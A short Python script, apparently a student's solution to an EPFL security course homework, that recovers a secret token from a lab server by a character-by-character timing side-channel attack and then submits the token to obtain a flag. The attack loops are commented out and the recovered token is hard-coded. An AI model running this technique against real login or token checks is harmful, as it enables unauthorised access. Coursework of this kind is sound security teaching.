import requests
import numpy as np
import time


url = 'http://com402.epfl.ch/hw5/ex2'
data = {
    'email': 'alexandru.mocanu@epfl.ch',
    'token': ''
}
character_set = [chr(ord('a') + i) for i in range(26)] + \
                [chr(ord('0') + i) for i in range(10)]

### Step by step
# Find waiting time per character
# for c in character_set:
#     data['token'] = '1c3383fc291' + c
#     start = time.time()
#     res = requests.post(url, json=data)
#     print('{} {:.4f}'.format(c, time.time() -  start))

### Automatic token retrieval (imprecise and extremely time consuming)
# num_tries = 5
# token = ''
# for i in range(12):
#     max_time = 0
#     max_char = None
#     for c in character_set:
#         data['token'] = token + c + 'a' * (11 - i)
#         durations = []
#         for _ in range(num_tries):
#             start = time.time()
#             requests.post(url, json=data)
#             durations.append(time.time() - start)
#         dur = np.median(durations)
#         if dur > max_time:
#             max_time = dur
#             max_char = c
#     token = token + max_char
#     print('Next character', max_char)

token = '1c3383fc291c'
print('Final token', token)
data['token'] = token
res = requests.post(url, json=data)
print('Flag', res.content)
